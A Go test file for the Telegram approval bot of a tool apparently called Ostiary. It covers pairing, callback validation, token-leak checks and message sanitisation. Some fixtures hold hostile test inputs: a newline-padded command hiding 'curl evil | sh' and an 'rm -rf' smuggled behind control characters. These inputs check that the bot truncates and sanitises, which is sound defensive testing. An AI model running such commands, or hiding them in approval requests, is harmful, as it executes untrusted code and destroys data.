package telegram

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/ASromancer/ostiary/internal/approval"
)

const tok = "123456:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789"

type call struct {
	Method string
	Body   map[string]any
}

type fake struct {
	mu      sync.Mutex
	calls   []call
	updates []Update
	failGet bool
	srv     *httptest.Server
	nextMsg int
}

func newFake(t *testing.T) *fake {
	f := &fake{nextMsg: 100}
	f.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		method := r.URL.Path[strings.LastIndex(r.URL.Path, "/")+1:]
		if !strings.HasPrefix(r.URL.Path, "/bot"+tok+"/") {
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "description": "Unauthorized"})
			return
		}
		b, _ := io.ReadAll(r.Body)
		var body map[string]any
		json.Unmarshal(b, &body)
		f.mu.Lock()
		f.calls = append(f.calls, call{method, body})
		var res any = true
		switch method {
		case "getMe":
			res = map[string]any{"id": 1, "username": "ostiary_bot"}
		case "getUpdates":
			if f.failGet {
				f.mu.Unlock()
				w.WriteHeader(500)
				return
			}
			res = f.updates
			if res == nil || len(f.updates) == 0 {
				res = []Update{}
				f.mu.Unlock()
				time.Sleep(5 * time.Millisecond)
				json.NewEncoder(w).Encode(map[string]any{"ok": true, "result": res})
				return
			}
			f.updates = nil
		case "sendMessage":
			f.nextMsg++
			res = map[string]any{"message_id": f.nextMsg}
		}
		f.mu.Unlock()
		json.NewEncoder(w).Encode(map[string]any{"ok": true, "result": res})
	}))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fake) push(u ...Update) { f.mu.Lock(); f.updates = append(f.updates, u...); f.mu.Unlock() }

func (f *fake) find(method string, n int) *call {
	return f.findWhere(method, n, nil)
}

// findWhere returns the nth (0-based) call of method whose body satisfies pred.
func (f *fake) findWhere(method string, n int, pred func(map[string]any) bool) *call {
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		f.mu.Lock()
		k := 0
		for i := range f.calls {
			if f.calls[i].Method == method && (pred == nil || pred(f.calls[i].Body)) {
				if k == n {
					c := f.calls[i]
					f.mu.Unlock()
					return &c
				}
				k++
			}
		}
		f.mu.Unlock()
		time.Sleep(5 * time.Millisecond)
	}
	return nil
}

func (f *fake) count(method string) int {
	f.mu.Lock()
	defer f.mu.Unlock()
	n := 0
	for _, c := range f.calls {
		if c.Method == method {
			n++
		}
	}
	return n
}

func (f *fake) bot() *Bot { return &Bot{Token: tok, Base: f.srv.URL} }

type env struct {
	f        *fake
	s        *Service
	resolved []string
	pending  map[int]bool
	mu       sync.Mutex
}

func newEnv(t *testing.T, chat, user int64, allow bool) *env {
	e := &env{f: newFake(t), pending: map[int]bool{}}
	e.s = New(Options{Bot: e.f.bot(), ChatID: chat, UserID: user, AllowDestructive: allow,
		Resolve: func(id int, c string, user int64) error {
			e.mu.Lock()
			defer e.mu.Unlock()
			if !e.pending[id] {
				return fmt.Errorf("no pending request #%d", id)
			}
			delete(e.pending, id)
			e.resolved = append(e.resolved, fmt.Sprintf("%d%s", id, c))
			return nil
		},
		Pending: func(id int) (approval.Request, bool) {
			e.mu.Lock()
			defer e.mu.Unlock()
			return approval.Request{ID: id}, e.pending[id]
		}})
	e.s.MinBackoff, e.s.MaxBackoff = time.Millisecond, 4*time.Millisecond
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { e.s.Run(ctx); close(done) }()
	t.Cleanup(func() { cancel(); <-done })
	return e
}

func (e *env) got() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return append([]string{}, e.resolved...)
}

func pairMsg(chatType string, chat, user int64, text string) Update {
	return Update{UpdateID: 1, Message: &Message{Chat: Chat{ID: chat, Type: chatType}, From: &User{ID: user}, Text: text, Date: time.Now().Unix()}}
}

func TestGetMeBadToken(t *testing.T) {
	f := newFake(t)
	_, err := (&Bot{Token: "bad", Base: f.srv.URL}).GetMe(context.Background())
	if err == nil || !strings.Contains(err.Error(), "không hợp lệ") {
		t.Fatal(err)
	}
	_, err = (&Bot{Token: "999:" + strings.Repeat("x", 35), Base: f.srv.URL}).GetMe(context.Background())
	if err == nil || !strings.Contains(err.Error(), "Unauthorized") {
		t.Fatal(err)
	}
	name, err := f.bot().GetMe(context.Background())
	if err != nil || name != "ostiary_bot" {
		t.Fatal(name, err)
	}
}

type failRT struct{}

// A transport whose error text carries the whole request URL, like net/http's own.
func (failRT) RoundTrip(r *http.Request) (*http.Response, error) {
	return nil, fmt.Errorf("dial failed for %s", r.URL)
}

func noLeak(t *testing.T, token string, err error) {
	t.Helper()
	if err == nil {
		t.Fatal("expected an error")
	}
	for i := 0; i+10 <= len(token); i++ {
		if strings.Contains(err.Error(), token[i:i+10]) {
			t.Fatalf("error leaks the token: %v", err)
		}
	}
}

func TestErrorsNeverContainToken(t *testing.T) {
	base := "123456:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789"
	for _, token := range []string{base, base + "\n", " " + base, base + `"`, base + " x", "\t" + base} {
		for _, b := range []*Bot{
			{Token: token, Base: "http://127.0.0.1:1"},
			{Token: token, Base: "http://127.0.0.1:1", HTTP: &http.Client{Transport: failRT{}}},
		} {
			_, err := b.GetMe(context.Background())
			noLeak(t, token, err)
		}
	}
}

func TestValidToken(t *testing.T) {
	if v, err := ValidToken(" \n" + tok + "\n"); err != nil || v != tok {
		t.Fatal(v, err)
	}
	for _, bad := range []string{"", "abc", "123:short", tok + "\n x", "x" + tok} {
		if _, err := ValidToken(bad); err == nil {
			t.Fatalf("%q accepted", bad)
		}
	}
}

func until(t *testing.T, what string, ok func() bool) {
	t.Helper()
	for end := time.Now().Add(3 * time.Second); time.Now().Before(end); time.Sleep(5 * time.Millisecond) {
		if ok() {
			return
		}
	}
	t.Fatal("timeout waiting for", what)
}

func pairMsgID(n int, chatType string, chat, user int64, text string) Update {
	u := pairMsg(chatType, chat, user, text)
	u.UpdateID = n
	return u
}

// A valid /pair only makes a candidate; nothing is paired until Confirm.
func TestPairingNeedsConfirm(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	e.s.BeginPairing("111111")
	e.f.push(pairMsgID(1, "group", -5, 7, "/pair 111111")) // ignored
	u := pairMsgID(2, "private", 7, 7, "/pair 111111")
	u.Message.From.Username, u.Message.From.FirstName, u.Message.From.LastName = "alice", "Al", "Ice"
	e.f.push(u)
	until(t, "candidate", func() bool { return e.s.Status().Candidate != nil })
	st := e.s.Status()
	if st.Paired || !st.Pairing || st.Candidate.UserID != 7 || st.Candidate.Username != "alice" || st.Candidate.Name != "Al Ice" {
		t.Fatalf("%+v %+v", st, st.Candidate)
	}
	if m := e.f.find("sendMessage", 0); m == nil || !strings.Contains(m.Body["text"].(string), "Đang chờ xác nhận") {
		t.Fatalf("%v", m)
	}
	if _, err := e.s.Confirm(8, nil); err == nil {
		t.Fatal("confirmed an account that is not the candidate")
	}
	c, err := e.s.Confirm(7, nil)
	if err != nil || c.ChatID != 7 {
		t.Fatal(c, err)
	}
	st = e.s.Status()
	if !st.Paired || st.Pairing || st.User != "alice" {
		t.Fatalf("%+v", st)
	}
	if m := e.f.findWhere("sendMessage", 0, func(b map[string]any) bool {
		return strings.Contains(b["text"].(string), "Đã kết nối với Ostiary trên")
	}); m == nil {
		t.Fatal("no confirmation message")
	}
	if _, err := e.s.Confirm(7, nil); err == nil {
		t.Fatal("confirmed twice")
	}
}

func TestPairingGroupIgnored(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	e.s.BeginPairing("222222")
	e.f.push(pairMsg("group", -5, 7, "/pair 222222"))
	time.Sleep(100 * time.Millisecond)
	if e.s.Status().Paired || e.s.Status().Candidate != nil || e.f.count("sendMessage") != 0 {
		t.Fatal("group message was acted on")
	}
}

func TestPairingWrongCodesEndAfterTen(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	e.s.BeginPairing("123456")
	for i := 0; i < 10; i++ {
		e.f.push(pairMsgID(i+1, "private", 7, 7, "/pair 000000"))
	}
	until(t, "pairing to end", func() bool { return !e.s.Status().Pairing })
	if st := e.s.Status(); st.Paired || !strings.Contains(st.LastError, "10 lần") {
		t.Fatalf("%+v", st)
	}
	// the right code no longer works
	e.f.push(pairMsgID(20, "private", 7, 7, "/pair 123456"))
	time.Sleep(100 * time.Millisecond)
	if st := e.s.Status(); st.Paired || st.Candidate != nil {
		t.Fatal("candidate after pairing ended")
	}
}

func TestPairingExpires(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	now := time.Now()
	e.s.mu.Lock()
	e.s.Now = func() time.Time { return now }
	e.s.mu.Unlock()
	e.s.BeginPairing("333333")
	now = now.Add(11 * time.Minute)
	e.f.push(pairMsg("private", 7, 7, "/pair 333333"))
	time.Sleep(100 * time.Millisecond)
	st := e.s.Status()
	if st.Paired || st.Candidate != nil || !strings.Contains(st.LastError, "hết hạn") {
		t.Fatalf("%+v", st)
	}
}

// A candidate waiting for confirmation dies with the pairing window.
func TestCandidateExpires(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	now := time.Now()
	e.s.mu.Lock()
	e.s.Now = func() time.Time { return now }
	e.s.mu.Unlock()
	e.s.BeginPairing("666666")
	e.f.push(pairMsg("private", 7, 7, "/pair 666666"))
	until(t, "candidate", func() bool { return e.s.Status().Candidate != nil })
	now = now.Add(11 * time.Minute)
	if _, err := e.s.Confirm(7, nil); err == nil || e.s.Status().Paired {
		t.Fatal("confirmed after the window closed")
	}
}

func req(id int, level string) approval.Request {
	return approval.Request{ID: id, Host: "h<1>", Agent: "a&b", Repo: "/x/proj", Kind: "run",
		Cmd: "echo <b>&", Level: level, Expires: time.Now().Add(time.Minute)}
}

func buttons(c *call) []map[string]any {
	rm, _ := c.Body["reply_markup"].(map[string]any)
	if rm == nil {
		return nil
	}
	var out []map[string]any
	for _, row := range rm["inline_keyboard"].([]any) {
		for _, b := range row.([]any) {
			out = append(out, b.(map[string]any))
		}
	}
	return out
}

func TestNotifyButtonsAndEscaping(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.s.Notify(req(1, "mutate"))
	m := e.f.find("sendMessage", 0)
	if m == nil || len(buttons(m)) != 3 {
		t.Fatalf("%+v", m)
	}
	txt := m.Body["text"].(string)
	if m.Body["parse_mode"] != "HTML" || !strings.Contains(txt, "<pre>echo &lt;b&gt;&amp;</pre>") ||
		!strings.Contains(txt, "h&lt;1&gt;") || !strings.Contains(txt, "a&amp;b") || !strings.Contains(txt, "Dự án: proj") {
		t.Fatal(txt)
	}
	e.s.Notify(req(2, "destructive"))
	m = e.f.findWhere("sendMessage", 0, func(b map[string]any) bool { return strings.Contains(b["text"].(string), "#2 ") })
	if b := buttons(m); len(b) != 2 {
		t.Fatalf("destructive allowed: %v", b)
	}
}

func TestNotifyNoButtonsWhenDestructiveOff(t *testing.T) {
	e := newEnv(t, 7, 7, false)
	e.s.Notify(req(1, "destructive"))
	tun := req(2, "destructive")
	tun.Kind = "tunnel"
	e.s.Notify(tun)
	e.s.Notify(req(3, "mutate"))
	for id, want := range map[int]int{1: 0, 2: 0, 3: 3} {
		m := e.f.findWhere("sendMessage", 0, func(b map[string]any) bool {
			return strings.Contains(b["text"].(string), fmt.Sprintf("Ostiary #%d ", id))
		})
		if m == nil || len(buttons(m)) != want {
			t.Fatalf("msg %d: %+v", id, m)
		}
	}
}

func TestNotifyTruncates(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	r := req(1, "mutate")
	r.Cmd = strings.Repeat("a", 5000)
	e.s.Notify(r)
	txt := e.f.find("sendMessage", 0).Body["text"].(string)
	if strings.Count(txt, "a") > 3100 || len(txt) > 4096 {
		t.Fatal(len(txt))
	}
}

func cbUpdate(id int, from, chat int64, data string) Update {
	return Update{UpdateID: id, Callback: &Callback{ID: fmt.Sprintf("cb%d", id), From: User{ID: from},
		Message: &Message{MessageID: 101, Chat: Chat{ID: chat, Type: "private"}}, Data: data}}
}

func nonce(t *testing.T, e *env, id int) string {
	m := e.f.find("sendMessage", 0)
	if m == nil {
		t.Fatal("no message")
	}
	d := buttons(m)[0]["callback_data"].(string)
	for i := 0; i < 400; i++ { // callbacks need the message id the daemon learns from the reply
		e.s.mu.Lock()
		ok := e.s.sent[id] != nil && e.s.sent[id].msgID != 0
		e.s.mu.Unlock()
		if ok {
			break
		}
		time.Sleep(5 * time.Millisecond)
	}
	return strings.Split(d, ":")[2]
}

func answerText(t *testing.T, e *env, n int) string {
	c := e.f.find("answerCallbackQuery", n)
	if c == nil {
		t.Fatal("no answer")
	}
	return c.Body["text"].(string)
}

func TestCallbackResolves(t *testing.T) {
	for _, choice := range []string{"y", "s", "n"} {
		e := newEnv(t, 7, 7, true)
		e.pending[4] = true
		e.s.Notify(req(4, "mutate"))
		n := nonce(t, e, 4)
		e.f.push(cbUpdate(1, 7, 7, "4:"+choice+":"+n))
		if a := answerText(t, e, 0); a != "đã ghi nhận" {
			t.Fatal(a)
		}
		if g := e.got(); len(g) != 1 || g[0] != "4"+choice {
			t.Fatal(g)
		}
	}
}

func TestCallbackRejected(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "mutate"))
	n := nonce(t, e, 4)
	bad := []Update{
		cbUpdate(1, 8, 7, "4:y:"+n),         // wrong user
		cbUpdate(2, 7, 8, "4:y:"+n),         // wrong chat
		cbUpdate(3, 7, 7, "4:y:0000000000"), // wrong nonce
		cbUpdate(4, 7, 7, "9:y:"+n),         // unknown id
		cbUpdate(5, 7, 7, "4:x:"+n),         // unknown choice
		cbUpdate(6, 7, 7, "junk"),
	}
	e.f.push(bad...)
	for i := range bad {
		want := "không hợp lệ"
		if i == 3 { // unknown id: sent before a restart, lock or re-pair
			want = "yêu cầu không còn"
		}
		if a := answerText(t, e, i); a != want {
			t.Fatalf("%d: %s", i, a)
		}
	}
	if len(e.got()) != 0 {
		t.Fatal("resolved", e.got())
	}
}

func TestCallbackStickyDestructiveRejected(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "destructive"))
	n := nonce(t, e, 4)
	e.f.push(cbUpdate(1, 7, 7, "4:s:"+n))
	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
		t.Fatal(a)
	}
}

func TestCallbackDestructiveOffRejectedButDenyAllowed(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "destructive"))
	n := nonce(t, e, 4)
	e.s.SetAllowDestructive(false)
	e.f.push(cbUpdate(1, 7, 7, "4:y:"+n))
	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
		t.Fatal(a)
	}
}

func TestCallbackAlreadyDecided(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "mutate"))
	n := nonce(t, e, 4)
	e.mu.Lock()
	delete(e.pending, 4) // decided on the machine, before Resolved ran
	e.mu.Unlock()
	e.f.push(cbUpdate(1, 7, 7, "4:y:"+n))
	if a := answerText(t, e, 0); a != "đã xử lý" || len(e.got()) != 0 {
		t.Fatal(a)
	}
	e.s.Resolved(4, approval.Decision{OK: true, Outcome: "approved", Auth: "os"})
	e.f.push(cbUpdate(2, 7, 7, "4:y:"+n))
	if a := answerText(t, e, 1); a != "đã xử lý" {
		t.Fatal(a)
	}
}

func TestResolvedEditsMessage(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.s.Notify(req(4, "mutate"))
	e.s.Resolved(4, approval.Decision{OK: true, Outcome: "approved", Auth: "telegram"})
	c := e.f.find("editMessageText", 0)
	if c == nil || !strings.Contains(c.Body["text"].(string), "Đã duyệt bởi bạn qua Telegram lúc") || c.Body["message_id"].(float64) != 101 {
		t.Fatalf("%+v", c)
	}
	e.s.Notify(req(5, "mutate"))
	e.s.Resolved(5, approval.Decision{Outcome: "approved", OK: true, Auth: "os"})
	c = e.f.findWhere("editMessageText", 0, func(b map[string]any) bool { return strings.Contains(b["text"].(string), "#5 ") })
	if c == nil || !strings.Contains(c.Body["text"].(string), "Đã xử lý trên máy") {
		t.Fatalf("%+v", c)
	}
}

func TestPollErrorsBackOffAndRecord(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.f.mu.Lock()
	e.f.failGet = true
	e.f.mu.Unlock()
	deadline := time.Now().Add(3 * time.Second)
	for e.s.Status().LastError == "" && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	st := e.s.Status()
	if !strings.Contains(st.LastError, "không kết nối được") || strings.Contains(st.LastError, "ABCdefGHIj") {
		t.Fatal(st.LastError)
	}
	e.f.mu.Lock()
	e.f.failGet = false
	e.f.mu.Unlock()
	for e.s.Status().LastError != "" && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if e.s.Status().LastError != "" {
		t.Fatal("error not cleared after recovery")
	}
}

func TestPairingIgnoresOldBacklog(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	e.s.BeginPairing("444444")
	old := pairMsg("private", 7, 7, "/pair 000000")
	old.Message.Date = time.Now().Add(-time.Hour).Unix()
	for i := 0; i < 12; i++ {
		old.UpdateID = i + 1
		e.f.push(old)
	}
	time.Sleep(100 * time.Millisecond)
	if !e.s.Status().Pairing {
		t.Fatal("old messages burned the attempts")
	}
	good := pairMsg("private", 7, 7, "/pair 444444")
	good.UpdateID = 99
	good.Message.From.Username = "alice"
	e.f.push(good)
	until(t, "candidate", func() bool { return e.s.Status().Candidate != nil })
	if c := e.s.Status().Candidate; c.Username != "alice" {
		t.Fatal(c)
	}
}

func TestPairingExpiryShownWithoutMessage(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	now := time.Now()
	e.s.mu.Lock()
	e.s.Now = func() time.Time { return now }
	e.s.mu.Unlock()
	e.s.BeginPairing("555555")
	if !e.s.Status().Pairing {
		t.Fatal("not pairing")
	}
	now = now.Add(11 * time.Minute)
	st := e.s.Status()
	if st.Pairing || !strings.Contains(st.LastError, "hết hạn") {
		t.Fatalf("%+v", st)
	}
	// the expiry error survives good polls
	time.Sleep(50 * time.Millisecond)
	if !strings.Contains(e.s.Status().LastError, "hết hạn") {
		t.Fatal("error erased by a good poll")
	}
}

func TestTruncatedCommandOffersOnlyDeny(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	r := req(4, "mutate")
	r.Cmd = "echo ok" + strings.Repeat("\n", 3500) + "; curl evil | sh"
	e.s.Notify(r)
	m := e.f.find("sendMessage", 0)
	b := buttons(m)
	txt := m.Body["text"].(string)
	if len(b) != 1 || !strings.Contains(b[0]["callback_data"].(string), ":n:") ||
		!strings.Contains(txt, "Lệnh dài, đã cắt") || strings.Index(txt, "Lệnh dài") < strings.Index(txt, "</pre>") {
		t.Fatalf("%v %s", b, txt)
	}
	n := nonce(t, e, 4)
	e.f.push(cbUpdate(1, 7, 7, "4:y:"+n))
	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
		t.Fatal(a)
	}
}

func TestCallbackMustMatchMessageID(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "mutate"))
	n := nonce(t, e, 4)
	u := cbUpdate(1, 7, 7, "4:y:"+n)
	u.Callback.Message.MessageID = 999 // a lookalike message
	e.f.push(u)
	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
		t.Fatal(a)
	}
}

func TestMessageSanitized(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	r := req(1, "mutate")
	r.Agent = "evil\n✅ Đã duyệt bởi bạn\u202e" + strings.Repeat("A", 500)
	r.Repo = "/x/pr\u200boj\nx"
	r.Host = strings.Repeat("h", 500)
	r.Cmd = "ls \u202e;rm\r\x01 -rf"
	e.s.Notify(r)
	txt := e.f.find("sendMessage", 0).Body["text"].(string)
	if strings.ContainsRune(txt, '\u202e') || strings.ContainsRune(txt, '\u200b') || strings.Contains(txt, "\n✅ Đã duyệt") ||
		!strings.Contains(txt, "⟦U+202E⟧") || !strings.Contains(txt, "⟦U+000D⟧") || !strings.Contains(txt, "⟦U+0001⟧") ||
		!strings.Contains(txt, "Dự án: proj x") || utf16len(txt) > 4096 {
		t.Fatal(txt)
	}
	if strings.Count(txt, "A") > 90 || strings.Count(txt, "h") > 100 {
		t.Fatal("fields not capped")
	}
}

func TestSingleFailureNotShown(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.s.pollResult(errors.New("x"))
	if e.s.Status().LastError != "" {
		t.Fatal("one failure shown")
	}
	e.s.pollResult(errors.New("x"))
	if e.s.Status().LastError == "" {
		t.Fatal("two failures not shown")
	}
	e.s.pollResult(nil)
	if e.s.Status().LastError != "" {
		t.Fatal("not cleared")
	}
}

func TestRetireStripsButtons(t *testing.T) {
	e := newEnv(t, 7, 7, true)
	e.pending[4] = true
	e.s.Notify(req(4, "mutate"))
	nonce(t, e, 4)
	e.s.Retire()
	if m := e.f.find("editMessageText", 0); m == nil || !strings.Contains(m.Body["text"].(string), "ngắt kết nối") {
		t.Fatalf("%v", m)
	}
}

// A second, different account with the right code means the code leaked: nobody gets paired.
func TestSecondAccountVoidsPairing(t *testing.T) {
	var mu sync.Mutex
	var first, second Candidate
	e := newEnv(t, 0, 0, true)
	e.s.o.OnPairVoid = func(a, b Candidate) { mu.Lock(); first, second = a, b; mu.Unlock() }
	e.s.BeginPairing("777777")
	e.f.push(pairMsgID(1, "private", 7, 7, "/pair 777777"))
	until(t, "candidate", func() bool { return e.s.Status().Candidate != nil })
	e.f.push(pairMsgID(2, "private", 8, 8, "/pair 777777"))
	until(t, "void", func() bool { return !e.s.Status().Pairing })
	st := e.s.Status()
	if st.Paired || st.Candidate != nil || !strings.Contains(st.LastError, "hơn một tài khoản") {
		t.Fatalf("%+v", st)
	}
	until(t, "callback", func() bool { mu.Lock(); defer mu.Unlock(); return first.UserID == 7 && second.UserID == 8 })
	for _, chat := range []float64{7, 8} {
		if m := e.f.findWhere("sendMessage", 0, func(b map[string]any) bool {
			return b["chat_id"] == chat && strings.Contains(b["text"].(string), "đã hủy vì an toàn")
		}); m == nil {
			t.Fatalf("chat %v not told", chat)
		}
	}
	if _, err := e.s.Confirm(7, nil); err == nil {
		t.Fatal("confirmed after the pairing was voided")
	}
	// the human's own /pair afterwards gets the same message, and pairs nothing
	e.f.push(pairMsgID(3, "private", 9, 9, "/pair 777777"))
	if m := e.f.findWhere("sendMessage", 0, func(b map[string]any) bool {
		return b["chat_id"] == float64(9) && strings.Contains(b["text"].(string), "đã hủy vì an toàn")
	}); m == nil {
		t.Fatal("late /pair not told")
	}
	if e.s.Status().Candidate != nil || e.s.Status().Pairing {
		t.Fatal("state after late /pair")
	}
}

func TestConfirmPersistFailureLeavesUnpaired(t *testing.T) {
	e := newEnv(t, 0, 0, true)
	e.s.BeginPairing("888888")
	e.f.push(pairMsg("private", 7, 7, "/pair 888888"))
	until(t, "candidate", func() bool { return e.s.Status().Candidate != nil })
	n := e.f.count("sendMessage")
	if _, err := e.s.Confirm(7, func(Candidate) error { return errors.New("disk full") }); err == nil {
		t.Fatal("confirmed although persist failed")
	}
	if st := e.s.Status(); st.Paired || st.Candidate == nil || e.f.count("sendMessage") != n {
		t.Fatalf("%+v", st)
	}
}
